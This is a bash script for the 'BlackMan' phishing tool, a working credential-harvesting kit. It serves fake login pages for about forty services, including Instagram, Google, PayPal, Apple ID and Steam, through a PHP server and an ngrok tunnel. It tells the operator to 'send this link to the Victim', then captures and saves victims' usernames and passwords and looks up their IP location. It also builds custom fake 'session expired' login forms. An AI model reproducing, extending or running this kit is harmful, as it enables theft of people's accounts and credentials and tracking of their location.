#!/bin/bash

RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')" YELLOW="$(printf '\033[1;33m')" GRAY="$(printf '\033[1;30m')"



Main() { 
    printf "          ${RED}[01]${CYAN} Instagram\e[0m      ${RED}[17]${CYAN} DropBox\e[0m        ${RED}[33]${CYAN} eBay\e[0m               \n"                                
    printf "          ${RED}[02]${CYAN} Facebook\e[0m       ${RED}[18]${CYAN} Adobe ID   \e[0m    ${RED}[34]${CYAN} Amazon\e[0m         \n"
    printf "          ${RED}[03]${CYAN} Snapchat\e[0m       ${RED}[19]${CYAN} Shopify   \e[0m     ${RED}[35]${CYAN} iCloud\e[0m          \n"
    printf "          ${RED}[04]${CYAN} Twitter\e[0m        ${RED}[20]${CYAN} Messenger   \e[0m   ${RED}[36]${CYAN} Spotify\e[0m          \n"                
    printf "          ${RED}[05]${CYAN} Github\e[0m         ${RED}[21]${CYAN} GitLab   \e[0m      ${RED}[37]${CYAN} Netflix\e[0m          \n"                
    printf "          ${RED}[06]${CYAN} Google\e[0m         ${RED}[22]${CYAN} Twitch   \e[0m      ${RED}[38]${CYAN} Stackoverflow\e[0m         \n"
    printf "          ${RED}[07]${CYAN} Origin\e[0m         ${RED}[23]${CYAN} MySpace    \e[0m    ${RED}[39]${CYAN} Samsung ID\e[0m          \n"
    printf "          ${RED}[08]${CYAN} Yahoo\e[0m          ${RED}[24]${CYAN} Badoo   \e[0m       ${RED}[40]${CYAN} Custom Page\e[0m         \n"        
    printf "          ${RED}[09]${CYAN} Linkedin\e[0m       ${RED}[25]${CYAN} VK   \e[0m          ${RED}[99]${CYAN} Exit BlackMan\e[0m         \n"         
    printf "          ${RED}[10]${CYAN} Protonmail\e[0m     ${RED}[26]${CYAN} Yandex   \e[0m               \n"
    printf "          ${RED}[11]${CYAN} Wordpress\e[0m      ${RED}[27]${CYAN} devianART   \e[0m            \n"
    printf "          ${RED}[12]${CYAN} Microsoft\e[0m      ${RED}[28]${CYAN} Wi-Fi   \e[0m                \n"
    printf "          ${RED}[13]${CYAN} IGFollowers\e[0m    ${RED}[29]${CYAN} PayPal  \e[0m                \n"
    printf "          ${RED}[14]${CYAN} Pinterest\e[0m      ${RED}[30]${CYAN} Steam  \e[0m                              \n"
    printf "          ${RED}[15]${CYAN} Apple ID\e[0m       ${RED}[31]${CYAN} Bitcoin  \e[0m                             \n"
    printf "          ${RED}[16]${CYAN} Verizon\e[0m        ${RED}[32]${CYAN} Playstation  \e[0m           \e[1;94m                  \n"
    printf "\n"
    read -p "${YELLOW}Choose an option -->> ${GRAY}" option

    if [[ $option == 1 ]]; then
    website="instagram"
    start

    elif [[ $option == 2 ]]; then
    website="facebook"
    start
    
    elif [[ $option == 3 ]]; then
    website="snapchat"  
    start
    
    elif [[ $option == 4 ]]; then
    website="twitter"
    start
    
    elif [[ $option == 5 ]]; then
    website="github"
    start
    
    elif [[ $option == 6 ]]; then
    website="google"
    start

    elif [[ $option == 7 ]]; then
    website="origin"
    start

    elif [[ $option == 8 ]]; then
    website="yahoo"
    start

    elif [[ $option == 9 ]]; then
    website="linkedin"
    start

    elif [[ $option == 10 ]]; then
    website="protonmail"
    start

    elif [[ $option == 11 ]]; then
    website="wordpress"
    start

    elif [[ $option == 12 ]]; then
    website="microsoft"
    start

    elif [[ $option == 13 ]]; then
    website="instafollowers"
    start

    elif [[ $option == 14 ]]; then
    website="pinterest"
    start

    elif [[ $option == 15 ]]; then
    website="apple"
    start

    elif [[ $option == 16 ]]; then
    website="verizon"
    start

    elif [[ $option == 17 ]]; then
    website="dropbox"
    start

    elif [[ $option == 18 ]]; then
    website="adobe"
    start

    elif [[ $option == 19 ]]; then
    website="shopify"
    start

    elif [[ $option == 20 ]]; then
    website="messenger"
    start

    elif [[ $option == 21 ]]; then
    website="gitlab"
    start

    elif [[ $option == 22 ]]; then
    website="twitch"
    start

    elif [[ $option == 23 ]]; then
    website="myspace"
    start

    elif [[ $option == 24 ]]; then
    website="badoo"
    start

    elif [[ $option == 25 ]]; then
    website="vk"
    start

    elif [[ $option == 26 ]]; then
    website="yandex"
    start

    elif [[ $option == 27 ]]; then
    website="devianart"
    start

    elif [[ $option == 28 ]]; then
    website="wifi"
    start

    elif [[ $option == 29 ]]; then
    website="paypal"
    start

    elif [[ $option == 30 ]]; then
    website="steam"
    start

    elif [[ $option == 31 ]]; then
    website="bitcoin"
    start

    elif [[ $option == 32 ]]; then
    website="playstation"
    start

    elif [[ $option == 33 ]]; then
    website="shopping"
    start

    elif [[ $option == 34 ]]; then
    website="amazon"
    start

    elif [[ $option == 35 ]]; then
    website="icloud"
    start

    elif [[ $option == 36 ]]; then
    website="spotify"
    start

    elif [[ $option == 37 ]]; then
    website="netflix"
    start

    elif [[ $option == 38 ]]; then
    website="stackoverflow"
    start
    
    elif [[ $option == 39 ]]; then
    website="samsung"
    start
    
    elif [[ $option == 40 ]]; then
    website="custom"
    createpage
    start
    
    elif [[ $option == 99 ]]; then
    sleep 1
    printf "${RED}Good Bye ${GREEN}^_^"
    exit
    
    else 
    printf "${RED}Invaild Oprion"
    sleep 1
    { clear ; Benner ; Main ; }
    fi
}

catch_ip() {
    touch sites/$website/saved.usernames.txt
    ip=$(grep -a 'IP:' sites/$website/ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    ua=$(grep 'User-Agent:' sites/$website/ip.txt | cut -d '"' -f2)
    printf "${GREEN}[-]${ORANGE} Victim IP:${GREEN} %s\e[0m\n" $ip
    printf "${GREEN}[-]${ORANGE} User-Agent:${GREEN} %s\e[0m\n" $ua
    printf "${GREEN}[-]${ORANGE} Saved:${GREEN} %s/saved.ip.txt\e[0m\n" $website
    cat sites/$website/ip.txt >> sites/$website/saved.ip.txt
    getcredentials
}

getcredentials() {
    printf "${RED}Waiting credentials ...\e[0m\n"
    while [ true ]; do

    if [[ -e "sites/$website/usernames.txt" ]]; then
    printf "${GREEN}Credentials Found !!!!\n"
    catch_cred
    fi
    sleep 1
    done
}

catch_cred() {
    account=$(grep -o 'Account:.*' sites/$website/usernames.txt | cut -d " " -f2)
    IFS=$'\n'
    password=$(grep -o 'Pass:.*' sites/$website/usernames.txt | cut -d ":" -f2)
    printf "${GREEN}[-]${ORANGE} Account: ${RED} %s\n" $account
    printf "${GREEN}[-]${ORANGE} Password: ${RED} %s\n" $password
    cat sites/$website/usernames.txt >> sites/$website/saved.usernames.txt
    printf "${GREEN}[-]${ORANGE} Saved:${RED} sites/%s/saved.usernames.txt \n" $website
    killall -2 php > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
    printf "\n"
    printf "${RED}[01]${CYAN} IP Details\n"
    printf "${RED}[02]${CYAN} Back to Main Menu\n"
    read -p "${YELLOW}Option >>> ${GRAY} " op
    if [[ $op == 1 ]]; then
    sleep 1
    ip_location
    elif [[ $op == 2 ]]; then
    sleep 1
    { clear ; Banner ; Main ; }
    else
    printf "${RED}Invaild Options .. "
    exit 0
    fi
}

ip_location() {

    ipaddripapico=$(curl -s "https://ipapi.co/$ip/json" -L)
    ipaddripapicom=$(curl -s "http://ip-api.com/json/$ip" -L)
    userip=$(echo $ipaddripapico | grep -Po '(?<="ip":)[^,]*' | tr -d '[]"')
    usercity=$(echo $ipaddripapico | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    useregion=$(echo $ipaddripapico | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    usercountry=$(echo $ipaddripapico | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    userlat=$(echo $ipaddripapicom | grep -Po '(?<="lat":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    userlon=$(echo $ipaddripapicom | grep -Po '(?<="lon":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    usertime=$(echo $ipaddripapicom | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    userpostal=$(echo $ipaddripapicom | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    userisp=$(echo $ipaddripapico | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    userasn=$(echo $ipaddripapico | grep -Po '(?<="asn":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    usercountrycode=$(echo $ipaddripapico | grep -Po '(?<="country_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    usercurrency=$(echo $ipaddripapico | grep -Po '(?<="currency":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    userlanguage=$(echo $ipaddripapico | grep -Po '(?<="languages":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    usercalling=$(echo $ipaddripapico | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    printf "${CYAN} Victim IP Details ....\n"
    printf "\n"
    printf "  ${ORANGE}  Ip Address >>    ${GREEN}  $userip\n"
    printf "  ${ORANGE}  City >>         ${GREEN}   $usercity\n"
    printf "  ${ORANGE}  Region >>       ${GREEN}   $useregion\n"
    printf "  ${ORANGE}  Country >>      ${GREEN}   $usercountry\n"
    printf "  ${ORANGE}  Latitude >>     ${GREEN}    $userlat\n"
    printf "  ${ORANGE}  Longitude >>    ${GREEN}    $userlon\n"
    printf "  ${ORANGE}  Time Zone >>    ${GREEN}    $usertime\n"
    printf "  ${ORANGE}  Postal Code >>  ${GREEN}    $userpostal\n"
    printf "  ${ORANGE}  Carrier >>      ${GREEN}   $userisp\n"
    printf "  ${ORANGE}  Country Code >> ${GREEN}   $usercountrycode\n"
    printf "  ${ORANGE}  Currency >>     ${GREEN}   $usercurrency\n"
    printf "  ${ORANGE}  Languages >>    ${GREEN}   $userlanguage\n"
    printf "  ${ORANGE}  Calling Code >> ${GREEN}   $usercalling\n"
    printf "  ${ORANGE}  Google Location >> ${CYAN}  https://maps.google.com/?q=$userlat,$userlon\e[0m\n"
    exit 1
}

start() {
    if [[ -e sites/$website/ip.txt ]]; then
    rm -rf sites/$website/ip.txt

    fi
    if [[ -e sites/$website/usernames.txt ]]; then
    rm -rf sites/$website/usernames.txt

    fi
    if [[ -e ngrok ]]; then
    echo ""
    else

    printf "${RED}Downloading Ngrok...\n"
    arch=$(uname -a | grep -o 'arm' | head -n1)
    arch2=$(uname -a | grep -o 'Android' | head -n1)
    if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

    if [[ -e ngrok-stable-linux-arm.zip ]]; then
    unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
    chmod +x ngrok
    rm -rf ngrok-stable-linux-arm.zip
    else
    printf "${GREEN}[!]${RED}Download error... Termux, run:${YELLOW} pkg install wget\n"
    exit 1
    fi
    else
    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
    if [[ -e ngrok-stable-linux-386.zip ]]; then
    unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
    chmod +x ngrok
    rm -rf ngrok-stable-linux-386.zip
    else
    printf "${GREEN}[!]${RED}Download error... \e[0m\n"
    exit 1
    fi
    fi
    fi

    printf "${RED}[#]${BLUE} Starting php server ...\n"
    cd sites/$website && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "${RED}[#]${BLUE} Starting ngrok server ...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 10

    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
    printf "${RED}### ${YELLOW}Send this link to the Victim: ${CYAN} %s \n" $link
    printf "\n"
    checkfound
}
checkfound() {
    printf "${ORANGE}Waiting victim open the link ...\e[0m\n"
    while [ true ]; do

    if [[ -e "sites/$website/ip.txt" ]]; then
    printf "${ORANGE}IP Found!\n"
    catch_ip

    fi
    sleep 1
    done 
}
createpage() {
    default_cap1="Wi-fi Session Expired"
    default_cap2="Please login again."
    default_user_text="Username:"
    default_pass_text="Password:"
    default_sub_text="Log-In"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
    cap1="${cap1:-${default_cap1}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
    cap2="${cap2:-${default_cap2}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
    user_text="${user_text:-${default_user_text}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
    pass_text="${pass_text:-${default_pass_text}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
    sub_text="${sub_text:-${default_sub_text}}"


    echo "<!DOCTYPE html>" > sites/custom/login.html
    echo "<html>" >> sites/custom/login.html
    echo "<body bgcolor=\"White\" text=\"Black\">" >> sites/custom/login.html
    echo 	"<center>" >> sites/custom/login.html
    echo	"<h1> $cap1 </h1>" >> sites/custom/login.html
    IFS=$'\n'
    echo	"<h2> $cap2 </h2>" >> sites/custom/login.html
    IFS=$'\n'
    echo "<style>" >> sites/custom/login.html
    echo "input {" >> sites/custom/login.html
    echo	"border: 1px solid gray;" >> sites/custom/login.html
    echo	"border-radius: 4px;" >> sites/custom/login.html
    echo	"margin: 3px;" >> sites/custom/login.html
    echo	"}" >> sites/custom/login.html
    echo "</style>" >> sites/custom/login.html
    echo "<style>" >> sites/custom/login.html
    echo "button {" >> sites/custom/login.html
    echo	"background-color: white;" >> sites/custom/login.html
    echo	"color: black;" >> sites/custom/login.html
    echo	"border: 1px solid black;" >> sites/custom/login.html
    echo	"padding: 1px 18px;" >> sites/custom/login.html
    echo	"}" >> sites/custom/login.html
    echo "</style>" >> sites/custom/login.html
    echo "<form method="POST" action="login.php">" >> sites/custom/login.html
    echo "<label> $user_text </label>" >> sites/custom/login.html
    IFS=$'\n'
    echo "<input type="text" name="username"></input>" >> sites/custom/login.html
    IFS=$'\n'
    echo "<br>" >> sites/custom/login.html
    IFS=$'\n'
    echo "<label> $pass_text </label>" >> sites/custom/login.html
    IFS=$'\n'
    echo "<input type="password" name="password"></input>" >> sites/custom/login.html
    IFS=$'\n'
    echo "<br><br>" >> sites/custom/login.html
    IFS=$'\n'
    echo "<button type="submit"> $sub_text </button>" >> sites/custom/login.html
    echo "</form>" >> sites/custom/login.html
    echo "</center>" >> sites/custom/login.html
    echo "</body>" >> sites/custom/login.html
    echo "</html>" >> sites/custom/login.html
    
}
Need() {
    command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Please Run install.sh "; exit 1 ; }
    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Please Run install.sh "; exit 1 ; }
    command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Please Run install.sh "; exit 1 ; }
    command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Please Run install.sh "; exit 1 ; }
    command -v figlet toilet > /dev/null 2>&1 || { echo >&2 "I require figlet toilet but it's not installed. Install it. Please Run install.sh "; exit 1 ; }
}
Banner() {
    clear
    printf "${ORANGE}Welcome to BlackMan Phishing Tool [Blackeye Version 2.0] \n"
    printf "\n"
    figlet BlackMan
    printf "\n"
    printf "\n"
    printf "${CYAN}[-]${GREEN} This Tool created by Kart Studio (Developer: Manash Mahanta)\n"
    printf "\n"
    date=$("date")
    printf "${GREEN}Started On -->> ${YELLOW}$date\e[0m\n"
    printf "\n"
}
Need
Banner
Main
